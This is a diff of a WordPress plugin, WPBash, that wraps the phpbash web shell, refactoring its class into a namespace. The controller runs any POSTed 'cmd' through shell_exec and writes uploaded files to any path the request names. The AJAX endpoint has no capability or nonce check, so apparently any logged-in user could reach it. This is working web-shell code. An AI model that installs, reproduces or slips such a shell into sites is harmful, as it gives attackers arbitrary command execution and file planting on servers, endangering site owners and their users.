@@ -2,59 +2,89 @@
 
 /**
  * Plugin Name: WPBash
- * Description: 
+ * Description: A Wordpress plugin wrapper for [phpbash](https://github.com/Arrexel/phpbash), a standalone, semi-interactive web shell. This script represent a security risk, use with caution.
  * Version: 1.0
+ * Author: Juan Pablo Juliao
+ * Author URI: jpjuliao.com
  */
  
-if ( ! defined( ABSPATH ) ) exit;
+Namespace Jpjuliao\WPBash;
+
+if (! defined(ABSPATH)) {
+    exit;
+}
+
+new WPBash();
  
-new Jpjuliao_WPBash();
- 
-class Jpjuliao_WPBash {
-		public function __construct() {
-				add_action('wp_ajax_wpbash', [$this, 'controller']);
-				add_action('admin_menu', [$this, 'register_menu']);
-		}
-		
+class WPBash
+{
+
+    /**
+     * Autoload
+     * @return void
+     */
+    public function __construct()
+    {
+        add_action('wp_ajax_wpbash', [$this, 'controller']);
+        add_action('admin_menu', [$this, 'register_page']);
+    }
+
+    /**
+     * Page URL
+     */
+    public $page_url;
+        
     /**
      * Register menu
      * @return void
      */
-    public function register_menu() {
-        add_submenu_page( 
-            'tools.php', 
-            'WPBash', 
-            'WPBash', 
-            'manage_options', 
-            'wpbash', 
+    public function register_page()
+    {
+        add_submenu_page(
+            'tools.php',
+            'WPBash',
+            'WPBash',
+            'manage_options',
+            'wpbash',
             array($this, 'view')
         );
+        $this->page_url = menu_page_url('wpbash');
     }
 
-		public function controller() {
-				if (ISSET($_POST['cmd'])) {
-				    $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
-				    foreach ($output as $line) {
-				        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
-				    }
-				    die(); 
-				} 
-				else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
-				    $filename = $_FILES["file"]["name"];
-				    $path = $_POST['path'];
-				    if ($path != "/") {
-				        $path .= "/";
-				    } 
-				    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
-				        echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
-				    } else {
-				        echo "Error uploading " . htmlentities($filename);
-				    }
-				    die();
-				}
-		}
-		function view() {
-				?>
+    /**
+     * Controller
+     * @return void
+     */
+    public function controller()
+    {
+        if (isset($_POST['cmd'])) {
+            $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
+            foreach ($output as $line) {
+                echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
+            }
+            die();
+        } elseif (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
+            $filename = $_FILES["file"]["name"];
+            $path = $_POST['path'];
+            if ($path != "/") {
+                $path .= "/";
+            }
+            if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
+                echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
+            } else {
+                echo "Error uploading " . htmlentities($filename);
+            }
+            die();
+        }
+    }
+
+    /**
+     * View
+     * @return void
+     */
+    public function view()
+    {
+        ?>
         <style>
             .inputtext {
                 font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
@@ -300,5 +330,5 @@ class Jpjuliao_WPBash {
             });
         </script>
      <?php
-		}
+    }
 }
